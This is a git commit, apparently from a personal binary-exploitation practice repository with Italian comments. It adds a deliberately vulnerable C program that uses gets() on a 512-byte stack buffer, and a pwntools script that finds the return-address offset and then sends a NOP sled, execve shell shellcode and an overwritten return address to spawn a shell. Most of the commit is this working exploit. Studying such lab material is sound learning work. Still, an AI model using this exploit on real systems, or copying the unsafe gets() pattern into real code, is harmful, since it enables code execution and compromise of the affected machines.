8353f8503d0ec96cff6b700655ff2ae73847e0e5
ale-romeo <alexromeo160@gmail.com>
2023-06-27 02:10:06 +0200

    stackb_done

---
+++ Machines/stackb_machine_pwnable.c
@@ -0,0 +1,11 @@
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char* argv[]){
+   char buffer[512];
+
+   puts("Ciao! Riesci a far spawnare una shell qui?");
+
+   gets(buffer);
+   return 0;
+}
--- Scripts/stack_pwnd.py
+++ Scripts/stack_pwnd.py
@@ -1,23 +1,39 @@
 from pwn import *
 from pwn import p64
+from struct import pack
 
 def main():
-    e = ELF('../Machines/stack')
+    e = ELF('../Machines/test')
     context.binary = e
     p = process(e.path)
-    flag_addr = p64(e.symbols['flag']) #Indirizzo della funzione flag
 
-    #Creazione del payload: junk + indirizzo variabile d'ambiente
-    payload = b'A'*72
-    print(flag_addr)
-    payload += flag_addr
-
-    print(payload)
-
-    #Invio payload e ottenimento della shell
-    p.sendlineafter(b': ', payload)
-    p.interactive()
+    p.recvline()
+    p.sendline(cyclic(600))
+    p.wait()
+    core = p.corefile
+    stack = core.rsp #indirizzo del registro rsp
+    info("Indirizzo del $rip = %#x", stack)
+    pattern = core.read(stack, 4)
+    rip_offset = cyclic_find(pattern) #dimensione del payload
+    info("L'offset del $rip è di %d", rip_offset)
     p.close()
+
+    p = process(e.path)
+    nop = b"\x90"*(rip_offset-70)
+    # Address in the middle of the nop stack
+    addr = stack - rip_offset//2
+    info("Probabile indirizzo di un nop = %s", hex(addr))
+    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+
+    payload = nop
+    payload += shellcode
+    payload = payload.ljust(rip_offset, b'A')
+    payload += pack("<Q", addr)
+
+    p.recvline()
+    p.sendline(payload)
+    p.interactive()
 
 
 if __name__ == '__main__':
